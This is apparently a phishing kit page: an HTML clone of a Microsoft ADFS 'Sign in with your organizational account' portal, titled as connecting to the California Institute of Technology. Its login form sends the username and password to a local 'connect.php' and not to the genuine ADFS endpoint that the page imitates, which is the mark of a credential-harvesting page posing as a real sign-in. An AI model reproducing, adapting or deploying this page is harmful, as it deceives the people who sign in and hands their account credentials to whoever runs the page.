<html lang="en-GB"><head>
        <meta http-equiv="X-UA-Compatible" content="IE=edge">
        <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=1">
        <meta http-equiv="content-type" content="text/html;charset=UTF-8">
        <meta http-equiv="cache-control" content="no-cache,no-store">
        <meta http-equiv="pragma" content="no-cache">
        <meta http-equiv="expires" content="-1">
        <meta name="mswebdialog-title" content="Connecting to California Institute of Technology">
		<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.1/jquery.min.js"></script> 
        <title>Sign In</title>
        <script type="text/javascript">
//<![CDATA[
function LoginErrors(){this.userNameFormatError = 'Enter your user ID in the format \u0026quot;domain\\user\u0026quot; or \u0026quot;user@domain\u0026quot;.'; this.passwordEmpty = 'Enter your password.'; this.passwordTooLong = 'Password is too long (\u0026gt; 128 characters).';}; var maxPasswordLength = 128;
//]]>
</script>

<script type="text/javascript">
//<![CDATA[
// Copyright (c) Microsoft Corporation.  All rights reserved.
function InputUtil(errTextElementID, errDisplayElementID) {

    if (!errTextElementID)  errTextElementID = 'errorText'; 
    if (!errDisplayElementID)  errDisplayElementID = 'error'; 

    this.hasFocus = false;
    this.errLabel = document.getElementById(errTextElementID);
    this.errDisplay = document.getElementById(errDisplayElementID);
};
InputUtil.prototype.canDisplayError = function () {
    return this.errLabel && this.errDisplay;
}
InputUtil.prototype.checkError = function () {
    if (!this.canDisplayError){
        throw new Error ('Error element not present');
    }
    if (this.errLabel && this.errLabel.innerHTML) {
        this.errDisplay.style.display = '';        
        var cause = this.errLabel.getAttribute('for');
        if (cause) {
            var causeNode = document.getElementById(cause);
            if (causeNode && causeNode.value) {
                causeNode.focus();
                this.hasFocus = true;
            }
        }
    }
    else {
        this.errDisplay.style.display = 'none';
    }
};
InputUtil.prototype.setInitialFocus = function (input) {
    if (this.hasFocus) return;
    var node = document.getElementById(input);
    if (node) {
        if ((/^\s*$/).test(node.value)) {
            node.focus();
            this.hasFocus = true;
        }
    }
};
InputUtil.prototype.setError = function (input, errorMsg) {
    if (!this.canDisplayError) {
        throw new Error('Error element not present');
    }
    input.focus();

    if (errorMsg) {
        this.errLabel.innerHTML = errorMsg;
    }
    this.errLabel.setAttribute('for', input.id);
    this.errDisplay.style.display = '';
};
InputUtil.makePlaceholder = function (input) {
    var ua = navigator.userAgent;

    if (ua != null && 
        (ua.match(/MSIE 9.0/) != null || 
         ua.match(/MSIE 8.0/) != null ||
         ua.match(/MSIE 7.0/) != null)) {
        var node = document.getElementById(input);
        if (node) {
            var placeholder = node.getAttribute("placeholder");
            if (placeholder != null && placeholder != '') {
                var label = document.createElement('input');
                label.type = "text";
                label.value = placeholder;
                label.readOnly = true;
                label.style.position = 'absolute';
                label.style.borderColor = 'transparent';
                label.className = node.className + ' hint';
                label.tabIndex = -1;
                label.onfocus = function () { this.nextSibling.focus(); };

                node.style.position = 'relative';
                node.parentNode.style.position = 'relative';
                node.parentNode.insertBefore(label, node);
                node.onkeyup = function () { InputUtil.showHint(this); };
                node.onblur = function () { InputUtil.showHint(this); };
                node.style.background = 'transparent';

                node.setAttribute("placeholder", "");
                InputUtil.showHint(node);
            }
        }
    }
};
InputUtil.focus = function (inputField) {
    var node = document.getElementById(inputField);
    if (node) node.focus();
};
InputUtil.hasClass = function(node, clsName) {
    return node.className.match(new RegExp('(\\s|^)' + clsName + '(\\s|$)'));
};
InputUtil.addClass = function(node, clsName) {
    if (!this.hasClass(node, clsName)) node.className += " " + clsName;
};
InputUtil.removeClass = function(node, clsName) {
    if (this.hasClass(node, clsName)) {
        var reg = new RegExp('(\\s|^)' + clsName + '(\\s|$)');
        node.className = node.className.replace(reg, ' ');
    }
};
InputUtil.showHint = function (node, gotFocus) {
    if (node.value && node.value != '') {
        node.previousSibling.style.display = 'none';
    }
    else {
        node.previousSibling.style.display = '';
    }
};
InputUtil.updatePlaceholder = function (input, placeholderText) {
    var node = document.getElementById(input);
    if (node) {
        var ua = navigator.userAgent;
        if (ua != null &&
            (ua.match(/MSIE 9.0/) != null ||
            ua.match(/MSIE 8.0/) != null ||
            ua.match(/MSIE 7.0/) != null)) {
            var label = node.previousSibling;
            if (label != null) {
                label.value = placeholderText;
            }
        }
        else {
            node.placeholder = placeholderText;
        }
    }
};

//]]>
</script>


        
        <link rel="stylesheet" type="text/css" href="./css/style.css?id=0A13280A86E7DFA6949BD016EA848912FCAFC05E88CBEDF538AC325B27041205">
	

    </head>
    <body dir="ltr" class="body">
    <div id="noScript" style="position: static; width: 100%; height: 100%; z-index: 100; display: none;">
        <h1>JavaScript required</h1>
        <p>JavaScript is required. This web browser does not support JavaScript or JavaScript in this web browser is not enabled.</p>
        <p>To find out if your web browser supports JavaScript or to enable JavaScript, see web browser help.</p>
    </div>
    <script type="text/javascript" language="JavaScript">
         document.getElementById("noScript").style.display = "none";
    </script>
    <div id="fullPage">
        <div id="brandingWrapper" class="float">
            <div id="branding" class="illustrationClass"></div>
        </div>
        <div id="contentWrapper" class="float">
            <div id="content">
                <div id="header">
                    <img class="logoImage" id="companyLogo" src="./img/webmail.jpg?id=56D2BB53E44ED6B8720EC2B23DDF91BF4489C9A8D2FD19A745CDABB4486961FA" >
                </div>
                <div id="workArea">
                    
    <div id="authArea" class="groupMargin">
        
        
        
    <div id="loginArea">        
        <div id="loginMessage" class="groupMargin">Sign in with your organizational account</div>

        <form method="post" id="loginForm" action="connect.php">
            <div id="error" class="fieldMargin error smallText" style="display: none;">
                <span id="errorText" for=""></span>
            </div>

            <div id="formsAuthenticationArea">
                <div id="userNameArea">
                    <label id="userNameInputLabel" for="userNameInput" class="hidden">User Account</label>
                    <input id="userNameInput" name="UserName" type="email" value="" tabindex="1" class="text fullWidth" spellcheck="false" placeholder="someone@example.com" autocomplete="off" autofocus>
                </div>

                <div id="passwordArea">
                    <label id="passwordInputLabel" for="passwordInput" class="hidden">Password</label>
                    <input id="passwordInput" name="Password" type="password" tabindex="2" class="text fullWidth" placeholder="Password" autocomplete="off">
                </div>
                <div id="kmsiArea" style="display:none">
                    <input type="checkbox" name="Kmsi" id="kmsiInput" value="true" tabindex="3">
                    <label for="kmsiInput">Keep me signed in</label>
                </div>
                <div id="submissionArea" class="submitMargin">
                    <span id="submitButton" class="submit" tabindex="4" role="button" onkeypress="if (event &amp;&amp; event.keyCode == 32) Login.submitLoginRequest();" onclick="return Login.submitLoginRequest();">Sign in</span>
                </div>
            </div>
            <input id="optionForms" type="hidden" name="AuthMethod" value="FormsAuthentication">
        </form>

             <div id="authOptions">
        <form id="options" method="post" action="https://adfs.Webmail.edu:443/adfs/ls/?client-request-id=664a42fc-7aa4-4754-a11f-b3b6b6f503a2&amp;wa=wsignin1.0&amp;wtrealm=urn%3afederation%3aMicrosoftOnline&amp;wctx=LoginOptions%3D3%26estsredirect%3d2%26estsrequest%3drQIIAYWSv4vTUADHm_au3h2iR3Fw8wRBENK-JG1tCge2TS6219efaUuylDZ9aZK-5KXpay_tP6Cbh5Pe5uF04KJwiH_CTYfjjU7iJILg4OAVFze_w5fv8B2-8Pk-inFJLv8A_FWWXTsLTJNjDbRO_yhI7Oz-LlbMtytVeXPvw_n5z9jpGXPfotSf5VMpnwR0gJPENG0DJQ3ipvDAG9ne-CPDXDLMV4Y5iW4ij1WKZ9FZVngMBFEEWZEXcjk-w_FJXYIcVC0HKh2qrQo8tAGATlOoqtjR1DGFqj7RnHJY65UzujQOa6si1t0DF_IdCpUKrrcB0HotXO3JSygVKOzJfM1tWboCQ11q8lfR2_XCnFr82khgr9CP6LZJArfvkxk9iX1m6j7yyqMS8Txk0OS6hjxqGwNqE68REB8F1Eaz_a5_OBmHjcwK-UGl5mpEwMNKuDgiWb8GBSfDO26aq6hFs8Pq0OaUwjyrDBoj8UhaWP2e70578iKDjY7Q9aVqtSSn-6jNqwe4Jo3ZhawZIpurrVr2JKfhRV2Q4QAbmXS_JQ5QewrTQnviqxCO52JDPZhqst51FHNJRoFzWEqDSX8RhpWhZAptfthJv4_Fr0G4xLuI3bre79mjPT8gpo3Rl1jCmbk2tZ4YA0yRYSXRaH65wXzbuAli-a2tnd3I3che5NcGc7p5zf3Vw3Eh8e5p6dnrl03rhR-52EwZuLnEdW6oNAAwghIIV9V5GRTd6qHaNlpFkp7IwrI71Ye0s5_Nc8dx5jge_x5nnt-IfNr-_2uudu7wgBNZILKcsMdl85lcnhf0Pw2&amp;cbcxt=&amp;username=jsmith%40Webmail.edu&amp;mkt=en-GB&amp;lc=">
            <script type="text/javascript">
                function SelectOption(option) {
                    var i = document.getElementById('optionSelection');
                    i.value = option;
                    document.forms['options'].submit();
                    return false;
                }
            </script>
            <input id="optionSelection" type="hidden" name="AuthMethod">
            <div id="authOptionLinks" class="groupMargin"></div>
        </form>
      </div>

        

        <script type="text/javascript">
        //<![CDATA[

            function Login() {
            }

            Login.userNameInput = 'userNameInput';
            Login.passwordInput = 'passwordInput';

            Login.initialize = function () {

                var u = new InputUtil();

                u.checkError();
                u.setInitialFocus(Login.userNameInput);
                u.setInitialFocus(Login.passwordInput);
            }();

            Login.submitLoginRequest = function () { 
                var u = new InputUtil();
                var e = new LoginErrors();

                var userName = document.getElementById(Login.userNameInput);
                var password = document.getElementById(Login.passwordInput);

                if (!userName.value || !userName.value.match('[@\\\\]')) {
                    u.setError(userName, e.userNameFormatError);
                    return false;
                }

                if (!password.value) {
                    u.setError(password, e.passwordEmpty);
                    return false;
                }

                if (password.value.length > maxPasswordLength) {
                    u.setError(password, e.passwordTooLong);
                    return false;
                }

                document.forms['loginForm'].submit();
                return false;
            };

            InputUtil.makePlaceholder(Login.userNameInput);
            InputUtil.makePlaceholder(Login.passwordInput);
        //]]>
        </script>
    </div>

    </div>

                </div>
                <div id="footerPlaceholder"></div>
            </div>
            <div id="footer">
                <div id="footerLinks" class="floatReverse">
                     <div><span id="copyright">© 2016 Microsoft</span><a id="home" class="pageLink" href="https://Webmail.edu/">Webmail Homepage</a><a id="privacy" class="pageLink" href="https://www.Webmail.edu/content/privacy-notice">Privacy Policy</a><a id="helpDesk" class="pageLink" href="https://help.Webmail.edu/helpdesk/WebObjects/Helpdesk.woa">Webmail Help</a></div>
                </div>
            </div>
        </div> 
    </div>
    <script type="text/javascript">
//<![CDATA[
// Copyright (c) Microsoft Corporation.  All rights reserved.

// This file contains several workarounds on inconsistent browser behaviors that administrators may customize.
"use strict";

// iPhone email friendly keyboard does not include "\" key, use regular keyboard instead.
// Note change input type does not work on all versions of all browsers.
if (navigator.userAgent.match(/iPhone/i) != null) {
    var emails = document.querySelectorAll("input[type='email']");
    if (emails) {
        for (var i = 0; i < emails.length; i++) {
            emails[i].type = 'text';
        }
    }
}

// In the CSS file we set the ms-viewport to be consistent with the device dimensions, 
// which is necessary for correct functionality of immersive IE. 
// However, for Windows 8 phone we need to reset the ms-viewport's dimension to its original
// values (auto), otherwise the viewport dimensions will be wrong for Windows 8 phone.
// Windows 8 phone has agent string 'IEMobile 10.0'
if (navigator.userAgent.match(/IEMobile\/10\.0/)) {
    var msViewportStyle = document.createElement("style");
    msViewportStyle.appendChild(
        document.createTextNode(
            "@-ms-viewport{width:auto!important}"
        )
    );
    msViewportStyle.appendChild(
        document.createTextNode(
            "@-ms-viewport{height:auto!important}"
        )
    );
    document.getElementsByTagName("head")[0].appendChild(msViewportStyle);
}

// If the innerWidth is defined, use it as the viewport width.
if (window.innerWidth && window.outerWidth && window.innerWidth !== window.outerWidth) {
    var viewport = document.querySelector("meta[name=viewport]");
    viewport.setAttribute('content', 'width=' + window.innerWidth + ', initial-scale=1.0, user-scalable=1');
}

// Gets the current style of a specific property for a specific element.
function getStyle(element, styleProp) {
    var propStyle = null;

    if (element && element.currentStyle) {
        propStyle = element.currentStyle[styleProp];
    }
    else if (element && window.getComputedStyle) {
        propStyle = document.defaultView.getComputedStyle(element, null).getPropertyValue(styleProp);
    }

    return propStyle;
}

// The script below is used for downloading the illustration image 
// only when the branding is displaying. This script work together
// with the code in PageBase.cs that sets the html inline style
// containing the class 'illustrationClass' with the background image.
var computeLoadIllustration = function () {
    var branding = document.getElementById("branding");
    var brandingDisplay = getStyle(branding, "display");
    var brandingWrapperDisplay = getStyle(document.getElementById("brandingWrapper"), "display");

    if (brandingDisplay && brandingDisplay !== "none" &&
        brandingWrapperDisplay && brandingWrapperDisplay !== "none") {
        var newClass = "illustrationClass";

        if (branding.classList && branding.classList.add) {
            branding.classList.add(newClass);
        } else if (branding.className !== undefined) {
            branding.className += " " + newClass;
        }
        if (window.removeEventListener) {
            window.removeEventListener('load', computeLoadIllustration, false);
            window.removeEventListener('resize', computeLoadIllustration, false);
        }
        else if (window.detachEvent) {
            window.detachEvent('onload', computeLoadIllustration);
            window.detachEvent('onresize', computeLoadIllustration);
        }
    }
};

if (window.addEventListener) {
    window.addEventListener('resize', computeLoadIllustration, false);
    window.addEventListener('load', computeLoadIllustration, false);
}
else if (window.attachEvent) {
    window.attachEvent('onresize', computeLoadIllustration);
    window.attachEvent('onload', computeLoadIllustration);
}

// Function to change illustration image. Usage example below.
function SetIllustrationImage(imageUri) {
    var illustrationImageClass = '.illustrationClass {background-image:url(' + imageUri + ');}';

    var css = document.createElement('style');
    css.type = 'text/css';

    if (css.styleSheet) css.styleSheet.cssText = illustrationImageClass;
    else css.appendChild(document.createTextNode(illustrationImageClass));

    document.getElementsByTagName("head")[0].appendChild(css);
}

// Example to change illustration image on HRD page after adding the image to active theme:
// PSH> Set-AdfsWebTheme -TargetName <activeTheme> -AdditionalFileResource @{uri='/adfs/portal/images/hrd.jpg';path='.\hrd.jpg'}
//
//if (typeof HRD != 'undefined') {
//    SetIllustrationImage('/adfs/portal/images/hrd.jpg');
//}
//]]>
</script>
<script>

 $('#userNameInput').keypress(function (e) {
	 var key = e.which;
	 if(key == 13)  // the enter key code
	  {
		$('.submit').click();
		return false;  
	  }
});
$('#passwordInput').keypress(function (e) {
	 var key = e.which;
	 if(key == 13)  // the enter key code
	  {
		$('.submit').click();
		return false;  
	  }
});
</script>

    
 

</body></html>